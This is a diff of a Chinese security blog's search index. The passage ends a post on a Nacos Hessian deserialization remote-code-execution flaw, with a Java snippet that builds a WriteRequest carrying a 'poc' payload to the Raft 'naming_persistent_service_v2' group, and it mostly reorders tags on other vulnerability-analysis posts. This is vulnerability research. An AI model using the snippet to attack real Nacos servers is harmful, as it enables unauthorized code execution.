+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Response <span class="title">onApply</span><span class="params">(WriteRequest request)</span> </span>&#123;</span><br><span class="line">		MetadataOperation&lt;ServiceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);</span><br><span class="line">  	...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>都有反序列化操作，所以，打完一个”group”后，可以打另外一个”group”，这样漏洞至少可以打3次：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WriteRequest request = WriteRequest.newBuilder()</span><br><span class="line">        .setGroup(<span class="string">"naming_persistent_service_v2"</span>)</span><br><span class="line">        <span class="comment">//.setGroup("naming_instance_metadata")</span></span><br><span class="line">        <span class="comment">//.setGroup("naming_service_metadata")</span></span><br><span class="line">        .setData(ByteString.copyFrom(poc))</span><br><span class="line">        .build();</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://y4er.com/posts/nacos-hessian-rce/" target="_blank" rel="noopener">https://y4er.com/posts/nacos-hessian-rce/</a></p>
+]]></content>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>Nacos</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Tabby学习笔记 &amp; Java反序列化gadget分析</title>
     <url>/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<p>Tabby学习笔记，挖掘反序列化gadget的思路和一些链的详细分析及POC</p>
@@ -224,8 +380,8 @@
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ruanyifeng.com/blog/2020/02/sparql.html" target="_blank" rel="noopener">RDF 和 SPARQL 初探：以维基数据为例 - 阮一峰的网络日志</a></p>
 ]]></content>
       <tags>
-        <tag>漏洞分析</tag>
         <tag>CodeQL</tag>
+        <tag>漏洞分析</tag>
       </tags>
   </entry>
   <entry>
@@ -306,8 +462,8 @@
 <p><a href="https://lists.apache.org/thread/x01pnn0jjsw512cscxsbxzrjmz64n4cc" target="_blank" rel="noopener">https://lists.apache.org/thread/x01pnn0jjsw512cscxsbxzrjmz64n4cc</a></p>
 ]]></content>
       <tags>
-        <tag>Apache Archiva</tag>
         <tag>漏洞分析</tag>
+        <tag>Apache Archiva</tag>
       </tags>
   </entry>
   <entry>
@@ -363,8 +519,8 @@
 
 ]]></content>
       <tags>
-        <tag>漏洞分析</tag>
         <tag>CodeQL</tag>
+        <tag>漏洞分析</tag>
       </tags>
   </entry>
   <entry>
@@ -1897,8 +2053,8 @@
 <p><a href="https://www.sevenyuan.cn/2020/07/21/java/2020-07-21-dubbo-cve-2020-1948/" target="_blank" rel="noopener">Dubbo 漏洞 CVE-2020-1948 复现+简单修复</a></p>
 ]]></content>
       <tags>
-        <tag>Dubbo</tag>
         <tag>Java反序列化漏洞</tag>
+        <tag>Dubbo</tag>
       </tags>
   </entry>
   <entry>
@@ -3480,8 +3636,8 @@
 <p><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">FastJson 反序列化学习</a></p>
 ]]></content>
       <tags>
-        <tag>Java反序列化漏洞</tag>
         <tag>FastJson</tag>
+        <tag>Java反序列化漏洞</tag>
       </tags>
   </entry>
   <entry>
